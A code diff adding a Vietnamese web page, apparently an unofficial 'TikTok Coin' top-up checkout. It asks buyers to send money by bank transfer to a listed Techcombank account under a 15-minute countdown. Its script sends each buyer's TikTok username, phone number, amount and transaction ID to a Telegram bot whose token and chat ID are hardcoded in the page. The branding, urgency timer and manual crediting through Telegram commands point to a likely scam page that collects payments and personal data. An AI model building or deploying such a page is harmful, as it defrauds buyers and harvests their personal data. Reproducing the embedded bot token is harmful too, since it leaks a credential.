@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Thanh Toán Chuyển Khoản - TikTok Coin</title>
+    <style>
+        :root {
+            --primary-color: #fe2c55;
+            --secondary-color: #25f4ee;
+            --dark-color: #121212;
+            --light-color: #ffffff;
+            --gray-color: #f8f9fa;
+            --text-color: #333333;
+            --success-color: #28a745;
+            --warning-color: #ffc107;
+            --danger-color: #dc3545;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--gray-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--light-color);
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .logo-icon {
+            font-size: 28px;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: var(--light-color);
+            padding: 12px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn-secondary {
+            background: #6c757d;
+        }
+        
+        .section {
+            padding: 40px 0;
+        }
+        
+        .payment-container {
+            background: var(--light-color);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 30px;
+        }
+        
+        .payment-header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .payment-header h2 {
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        
+        .bank-info {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .bank-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .bank-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .bank-label {
+            font-weight: 600;
+            color: #495057;
+            min-width: 150px;
+        }
+        
+        .bank-value {
+            font-weight: 500;
+            text-align: right;
+            flex: 1;
+        }
+        
+        .copy-btn {
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-left: 10px;
+            transition: background 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: var(--secondary-color);
+        }
+        
+        .copy-btn.copied {
+            background: var(--success-color);
+        }
+        
+        .countdown {
+            text-align: center;
+            margin: 25px 0;
+            padding: 20px;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+        }
+        
+        .countdown-timer {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--danger-color);
+            margin: 10px 0;
+        }
+        
+        .instructions {
+            background: #e7f3ff;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 25px;
+        }
+        
+        .instructions h3 {
+            margin-bottom: 15px;
+            color: #0d6efd;
+        }
+        
+        .instructions ol {
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 10px;
+        }
+        
+        .notification {
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .notification.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        
+        .notification.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .notification.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 25px;
+        }
+        
+        .confirmation-dialog {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .confirmation-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .confirmation-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .bank-item {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .bank-label {
+                min-width: auto;
+            }
+            
+            .bank-value {
+                text-align: left;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .confirmation-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">🎵</div>
+                    <h1>Thanh Toán Chuyển Khoản</h1>
+                </div>
+                <button id="back-to-main" class="btn btn-secondary">Quay Lại</button>
+            </div>
+        </div>
+    </header>
+
+    <section class="section">
+        <div class="container">
+            <div class="payment-container">
+                <div class="payment-header">
+                    <h2>THANH TOÁN CHUYỂN KHOẢN NGÂN HÀNG</h2>
+                    <p>Vui lòng chuyển khoản theo thông tin bên dưới</p>
+                </div>
+
+                <div class="notification info">
+                    <strong>Lưu ý:</strong> Mã giao dịch của bạn là <span id="transaction-id">TD2023123456</span>. 
+                    Vui lòng ghi nhớ mã này và chuyển khoản chính xác số tiền.
+                </div>
+
+                <div class="bank-info">
+                    <h3 style="text-align: center; margin-bottom: 20px; color: var(--primary-color);">THÔNG TIN TÀI KHOẢN NGÂN HÀNG</h3>
+                    
+                    <div class="bank-item">
+                        <span class="bank-label">Ngân hàng:</span>
+                        <span class="bank-value">Techcombank</span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Số tài khoản:</span>
+                        <span class="bank-value">
+                            <span id="bank-account">19036869996019</span>
+                            <button class="copy-btn" data-text="19036869996019">Sao chép</button>
+                        </span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Chủ tài khoản:</span>
+                        <span class="bank-value">NGUYEN VAN A</span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Số tiền:</span>
+                        <span class="bank-value">
+                            <span id="payment-amount">100,000</span> VNĐ
+                            <button class="copy-btn" data-text="100000">Sao chép</button>
+                        </span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Nội dung chuyển khoản:</span>
+                        <span class="bank-value">
+                            <span id="payment-content">TD2023123456</span>
+                            <button class="copy-btn" data-text="TD2023123456">Sao chép</button>
+                        </span>
+                    </div>
+                </div>
+
+                <div class="payment-info">
+                    <h3>Thông Tin Giao Dịch</h3>
+                    <div class="bank-item">
+                        <span class="bank-label">Tên TikTok:</span>
+                        <span class="bank-value" id="payment-username">username</span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Số điện thoại:</span>
+                        <span class="bank-value" id="payment-phone">0123456789</span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Số xu nhận được:</span>
+                        <span class="bank-value" id="payment-coins">300 Xu</span>
+                    </div>
+                    <div class="bank-item">
+                        <span class="bank-label">Thời gian tạo:</span>
+                        <span class="bank-value" id="payment-time">12:30 15/12/2023</span>
+                    </div>
+                </div>
+
+                <div class="countdown">
+                    <h3>Thời Gian Còn Lại Để Thanh Toán</h3>
+                    <div class="countdown-timer" id="countdown-timer">15:00</div>
+                    <p>Sau khi hết thời gian, giao dịch sẽ tự động hủy</p>
+                </div>
+
+                <div class="instructions">
+                    <h3>Hướng Dẫn Thanh Toán</h3>
+                    <ol>
+                        <li>Mở ứng dụng ngân hàng trên điện thoại hoặc máy tính</li>
+                        <li>Chọn chức năng chuyển khoản</li>
+                        <li>Nhập thông tin tài khoản ngân hàng như bên trên</li>
+                        <li>Nhập chính xác số tiền: <strong id="instruction-amount">100,000 VNĐ</strong></li>
+                        <li>Nhập nội dung chuyển khoản: <strong id="instruction-content">TD2023123456</strong></li>
+                        <li>Kiểm tra và xác nhận chuyển khoản</li>
+                        <li>Quay lại trang này và bấm "Tôi Đã Chuyển Khoản"</li>
+                    </ol>
+                </div>
+
+                <div class="action-buttons">
+                    <button id="confirm-payment" class="btn">Tôi Đã Chuyển Khoản</button>
+                    <button id="cancel-payment" class="btn btn-secondary">Hủy Giao Dịch</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Confirmation Dialog -->
+    <div id="confirmation-dialog" class="confirmation-dialog">
+        <div class="confirmation-content">
+            <h3 style="margin-bottom: 15px; color: var(--primary-color);">Xác Nhận Thanh Toán</h3>
+            <p>Bạn có chắc chắn đã chuyển khoản thành công?</p>
+            <p style="font-size: 14px; color: #666; margin-top: 10px;">
+                <strong>Lưu ý:</strong> Thông tin sai lệch có thể dẫn đến chậm trễ trong việc xử lý giao dịch.
+            </p>
+            <div class="confirmation-buttons">
+                <button id="confirm-yes" class="btn">Có, Tôi Đã Chuyển Khoản</button>
+                <button id="confirm-no" class="btn btn-secondary">Kiểm Tra Lại</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==================== CẤU HÌNH TELEGRAM BOT ====================
+        const TELEGRAM_BOT_TOKEN = '8456385484:AAGwIMMR4HmFS4kppN7xZxJaeQRr1zO5Yqk';
+        const TELEGRAM_CHAT_ID = '5444123544';
+        
+        // ==================== BIẾN TOÀN CỤC ====================
+        let currentTransaction = {};
+        let countdownInterval;
+        let isProcessing = false;
+
+        // ==================== KHỞI TẠO TRANG ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            const transactionData = localStorage.getItem('currentTransaction');
+            
+            if (!transactionData) {
+                alert('❌ Không tìm thấy thông tin giao dịch. Vui lòng quay lại trang chủ và thử lại.');
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            try {
+                currentTransaction = JSON.parse(transactionData);
+                displayTransactionInfo();
+                startCountdown(15 * 60); // 15 phút
+                setupEventListeners();
+                
+                // Gửi thông báo đơn hàng mới đến Telegram
+                sendOrderNotification('NEW_ORDER');
+                
+            } catch (error) {
+                console.error('❌ Lỗi khởi tạo trang:', error);
+                alert('❌ Có lỗi xảy ra khi khởi tạo trang. Vui lòng thử lại.');
+                window.location.href = 'index.html';
+            }
+        });
+
+        // ==================== THIẾT LẬP EVENT LISTENERS ====================
+        function setupEventListeners() {
+            // Quay lại trang chính
+            document.getElementById('back-to-main').addEventListener('click', function() {
+                if (!isProcessing) {
+                    showCancelConfirmation();
+                }
+            });
+            
+            // Hủy giao dịch
+            document.getElementById('cancel-payment').addEventListener('click', function() {
+                if (!isProcessing) {
+                    showCancelConfirmation();
+                }
+            });
+            
+            // Xác nhận thanh toán
+            document.getElementById('confirm-payment').addEventListener('click', function() {
+                if (!isProcessing) {
+                    showConfirmationDialog();
+                }
+            });
+            
+            // Xác nhận dialog
+            document.getElementById('confirm-yes').addEventListener('click', confirmPayment);
+            document.getElementById('confirm-no').addEventListener('click', hideConfirmationDialog);
+            
+            // Sao chép nội dung
+            document.addEventListener('click', handleCopyButtons);
+        }
+
+        // ==================== HIỂN THỊ THÔNG TIN GIAO DỊCH ====================
+        function displayTransactionInfo() {
+            if (!currentTransaction) return;
+            
+            document.getElementById('transaction-id').textContent = currentTransaction.transactionId;
+            document.getElementById('payment-username').textContent = currentTransaction.username;
+            document.getElementById('payment-phone').textContent = currentTransaction.phone;
+            document.getElementById('payment-amount').textContent = formatCurrency(currentTransaction.amount);
+            document.getElementById('payment-coins').textContent = currentTransaction.coins;
+            document.getElementById('payment-time').textContent = formatDate(currentTransaction.timestamp);
+            document.getElementById('instruction-amount').textContent = formatCurrency(currentTransaction.amount) + ' VNĐ';
+            document.getElementById('instruction-content').textContent = currentTransaction.transactionId;
+            
+            // Cập nhật nút sao chép
+            document.querySelectorAll('.copy-btn').forEach(btn => {
+                const text = btn.dataset.text;
+                if (text === '100000') {
+                    btn.dataset.text = currentTransaction.amount;
+                } else if (text === 'TD2023123456') {
+                    btn.dataset.text = currentTransaction.transactionId;
+                }
+            });
+        }
+
+        // ==================== XỬ LÝ NÚT SAO CHÉP ====================
+        function handleCopyButtons(e) {
+            if (e.target.classList.contains('copy-btn')) {
+                const text = e.target.dataset.text;
+                copyToClipboard(text).then(() => {
+                    // Hiệu ứng sao chép thành công
+                    const originalText = e.target.textContent;
+                    e.target.textContent = '✅ Đã sao chép!';
+                    e.target.classList.add('copied');
+                    
+                    setTimeout(() => {
+                        e.target.textContent = originalText;
+                        e.target.classList.remove('copied');
+                    }, 2000);
+                }).catch(err => {
+                    console.error('❌ Lỗi sao chép:', err);
+                    alert('❌ Không thể sao chép. Vui lòng sao chép thủ công.');
+                });
+            }
+        }
+
+        // ==================== SAO CHÉP VÀO CLIPBOARD ====================
+        async function copyToClipboard(text) {
+            try {
+                if (navigator.clipboard && window.isSecureContext) {
+                    await navigator.clipboard.writeText(text);
+                } else {
+                    // Fallback cho các trình duyệt cũ
+                    const textArea = document.createElement('textarea');
+                    textArea.value = text;
+                    textArea.style.position = 'fixed';
+                    textArea.style.opacity = '0';
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                }
+                return true;
+            } catch (err) {
+                throw new Error('Không thể sao chép vào clipboard');
+            }
+        }
+
+        // ==================== HIỂN THỊ DIALOG XÁC NHẬN ====================
+        function showConfirmationDialog() {
+            const dialog = document.getElementById('confirmation-dialog');
+            dialog.style.display = 'flex';
+            
+            // Vô hiệu hóa các nút khác
+            setProcessingState(true);
+        }
+
+        // ==================== ẨN DIALOG XÁC NHẬN ====================
+        function hideConfirmationDialog() {
+            const dialog = document.getElementById('confirmation-dialog');
+            dialog.style.display = 'none';
+            
+            // Kích hoạt lại các nút
+            setProcessingState(false);
+        }
+
+        // ==================== XÁC NHẬN THANH TOÁN ====================
+        async function confirmPayment() {
+            try {
+                setProcessingState(true);
+                hideConfirmationDialog();
+                
+                // Hiển thị trạng thái loading
+                const confirmBtn = document.getElementById('confirm-payment');
+                const originalText = confirmBtn.textContent;
+                confirmBtn.innerHTML = '⏳ Đang xử lý...';
+                confirmBtn.disabled = true;
+                
+                // Gửi thông báo xác nhận thanh toán đến Telegram
+                const success = await sendOrderNotification('PAYMENT_CONFIRMED');
+                
+                if (success) {
+                    // Cập nhật trạng thái giao dịch
+                    updateTransactionStatus('pending');
+                    
+                    // Hiển thị thông báo thành công
+                    showSuccessMessage();
+                    
+                    // Xóa thông tin giao dịch hiện tại
+                    localStorage.removeItem('currentTransaction');
+                    
+                    // Chuyển hướng sau 3 giây
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 3000);
+                    
+                } else {
+                    throw new Error('Không thể gửi thông báo xác nhận');
+                }
+                
+            } catch (error) {
+                console.error('❌ Lỗi xác nhận thanh toán:', error);
+                showErrorMessage('❌ Có lỗi xảy ra khi xác nhận thanh toán. Vui lòng thử lại.');
+                setProcessingState(false);
+                confirmBtn.textContent = originalText;
+                confirmBtn.disabled = false;
+            }
+        }
+
+        // ==================== HIỂN THỊ THÔNG BÁO THÀNH CÔNG ====================
+        function showSuccessMessage() {
+            const notification = document.createElement('div');
+            notification.className = 'notification success';
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                z-index: 1000;
+                max-width: 400px;
+                animation: slideIn 0.3s ease;
+            `;
+            
+            notification.innerHTML = `
+                <strong>✅ Xác nhận thành công!</strong><br>
+                Thông tin thanh toán của bạn đã được ghi nhận.<br>
+                Admin sẽ xác nhận và nạp xu vào tài khoản của bạn trong thời gian sớm nhất.<br>
+                <em>Chuyển hướng về trang chủ trong 3 giây...</em>
+            `;
+            
+            document.body.appendChild(notification);
+            
+            // Thêm CSS animation
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideIn {
+                    from {
+                        transform: translateX(100%);
+                        opacity: 0;
+                    }
+                    to {
+                        transform: translateX(0);
+                        opacity: 1;
+                    }
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        // ==================== HIỂN THỊ THÔNG BÁO LỖI ====================
+        function showErrorMessage(message) {
+            const notification = document.createElement('div');
+            notification.className = 'notification error';
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                z-index: 1000;
+                max-width: 400px;
+                animation: slideIn 0.3s ease;
+            `;
+            
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            // Tự động ẩn sau 5 giây
+            setTimeout(() => {
+                notification.remove();
+            }, 5000);
+        }
+
+        // ==================== XÁC NHẬN HỦY GIAO DỊCH ====================
+        function showCancelConfirmation() {
+            if (confirm('❌ Bạn có chắc chắn muốn hủy giao dịch này?\n\nSau khi hủy, bạn sẽ cần tạo giao dịch mới để nạp xu.')) {
+                cancelTransaction();
+            }
+        }
+
+        // ==================== HỦY GIAO DỊCH ====================
+        function cancelTransaction() {
+            try {
+                clearInterval(countdownInterval);
+                sendOrderNotification('CANCELLED_ORDER');
+                updateTransactionStatus('cancelled');
+                localStorage.removeItem('currentTransaction');
+                window.location.href = 'index.html';
+            } catch (error) {
+                console.error('❌ Lỗi hủy giao dịch:', error);
+                alert('❌ Có lỗi xảy ra khi hủy giao dịch. Vui lòng thử lại.');
+            }
+        }
+
+        // ==================== THIẾT LẬP TRẠNG THÁI XỬ LÝ ====================
+        function setProcessingState(processing) {
+            isProcessing = processing;
+            const buttons = document.querySelectorAll('.btn');
+            buttons.forEach(btn => {
+                if (btn.id !== 'confirm-yes' && btn.id !== 'confirm-no') {
+                    btn.disabled = processing;
+                }
+            });
+        }
+
+        // ==================== BỘ ĐẾM NGƯỢC ====================
+        function startCountdown(duration) {
+            let timer = duration;
+            const countdownElement = document.getElementById('countdown-timer');
+            
+            countdownInterval = setInterval(function() {
+                const minutes = Math.floor(timer / 60);
+                const seconds = timer % 60;
+                
+                countdownElement.textContent = 
+                    (minutes < 10 ? '0' : '') + minutes + ':' + 
+                    (seconds < 10 ? '0' : '') + seconds;
+                
+                if (--timer < 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = 'Hết hạn';
+                    countdownElement.style.color = 'var(--danger-color)';
+                    handleExpiredTransaction();
+                }
+            }, 1000);
+        }
+
+        // ==================== XỬ LÝ GIAO DỊCH HẾT HẠN ====================
+        function handleExpiredTransaction() {
+            if (isProcessing) return;
+            
+            alert('⏰ Thời gian thanh toán đã hết. Giao dịch đã tự động hủy.');
+            sendOrderNotification('EXPIRED_ORDER');
+            updateTransactionStatus('expired');
+            localStorage.removeItem('currentTransaction');
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 3000);
+        }
+
+        // ==================== GỬI THÔNG BÁO TELEGRAM ====================
+        async function sendOrderNotification(type) {
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log(`📤 [DEMO] Gửi thông báo ${type}:`, currentTransaction);
+                return true;
+            }
+            
+            try {
+                let message = '';
+                
+                switch(type) {
+                    case 'NEW_ORDER':
+                        message = `🆕 <b>ĐƠN HÀNG CHUYỂN KHOẢN MỚI</b>\n\n` +
+                                 `👤 <b>Tài khoản:</b> ${currentTransaction.username}\n` +
+                                 `📞 <b>SĐT:</b> ${currentTransaction.phone}\n` +
+                                 `💰 <b>Số tiền:</b> ${formatCurrency(currentTransaction.amount)} VNĐ\n` +
+                                 `🪙 <b>Số xu:</b> ${currentTransaction.coins} Xu\n` +
+                                 `💳 <b>Phương thức:</b> ${getPaymentMethod(currentTransaction.payment)}\n` +
+                                 `🏦 <b>Ngân hàng:</b> Techcombank\n` +
+                                 `🔢 <b>STK:</b> 19036869996019\n` +
+                                 `🆔 <b>Mã GD:</b> <code>${currentTransaction.transactionId}</code>\n` +
+                                 `⏰ <b>Thời gian:</b> ${formatDate(currentTransaction.timestamp)}\n\n` +
+                                 `⚠️ <i>Chờ khách hàng xác nhận chuyển khoản!</i>`;
+                        break;
+                        
+                    case 'PAYMENT_CONFIRMED':
+                        message = `✅ <b>KHÁCH XÁC NHẬN CHUYỂN KHOẢN</b>\n\n` +
+                                 `👤 <b>Tài khoản:</b> ${currentTransaction.username}\n` +
+                                 `📞 <b>SĐT:</b> ${currentTransaction.phone}\n` +
+                                 `💰 <b>Số tiền:</b> ${formatCurrency(currentTransaction.amount)} VNĐ\n` +
+                                 `🆔 <b>Mã GD:</b> ${currentTransaction.transactionId}\n` +
+                                 `⏰ <b>Thời gian xác nhận:</b> ${formatDate(new Date())}\n\n` +
+                                 `💡 <b>Lệnh cập nhật:</b>\n` +
+                                 `<code>/complete ${currentTransaction.transactionId}</code> - Hoàn thành\n` +
+                                 `<code>/cancel ${currentTransaction.transactionId}</code> - Hủy bỏ\n\n` +
+                                 `⚠️ <i>Vui lòng kiểm tra tài khoản và xử lý đơn hàng!</i>`;
+                        break;
+                        
+                    case 'CANCELLED_ORDER':
+                        message = `❌ <b>ĐƠN HÀNG BỊ HỦY</b>\n\n` +
+                                 `👤 <b>Tài khoản:</b> ${currentTransaction.username}\n` +
+                                 `🆔 <b>Mã GD:</b> ${currentTransaction.transactionId}\n` +
+                                 `⏰ <b>Thời gian hủy:</b> ${formatDate(new Date())}`;
+                        break;
+                        
+                    case 'EXPIRED_ORDER':
+                        message = `⏰ <b>ĐƠN HÀNG HẾT HẠN</b>\n\n` +
+                                 `👤 <b>Tài khoản:</b> ${currentTransaction.username}\n` +
+                                 `🆔 <b>Mã GD:</b> ${currentTransaction.transactionId}\n` +
+                                 `⏰ <b>Thời gian hết hạn:</b> ${formatDate(new Date())}`;
+                        break;
+                }
+                
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                const data = await response.json();
+                return data.ok;
+                
+            } catch (error) {
+                console.error('❌ Lỗi gửi Telegram:', error);
+                return false;
+            }
+        }
+
+        // ==================== CẬP NHẬT TRẠNG THÁI GIAO DỊCH ====================
+        function updateTransactionStatus(status) {
+            const history = JSON.parse(localStorage.getItem('rechargeHistory') || '[]');
+            const transactionIndex = history.findIndex(t => t.transactionId === currentTransaction.transactionId);
+            
+            if (transactionIndex !== -1) {
+                history[transactionIndex].status = status;
+                localStorage.setItem('rechargeHistory', JSON.stringify(history));
+                console.log(`✅ Đã cập nhật trạng thái ${currentTransaction.transactionId} thành: ${status}`);
+            }
+        }
+
+        // ==================== HÀM TIỆN ÍCH ====================
+        function formatCurrency(amount) {
+            return parseInt(amount).toLocaleString('vi-VN');
+        }
+        
+        function formatDate(dateString) {
+            return new Date(dateString).toLocaleString('vi-VN');
+        }
+        
+        function getPaymentMethod(method) {
+            const methods = {
+                'momo': 'Ví MoMo',
+                'zalo': 'Ví ZaloPay',
+                'bank': 'Chuyển khoản',
+                'card': 'Thẻ cào'
+            };
+            return methods[method] || method;
+        }
+    </script>
+</body>
+</html>
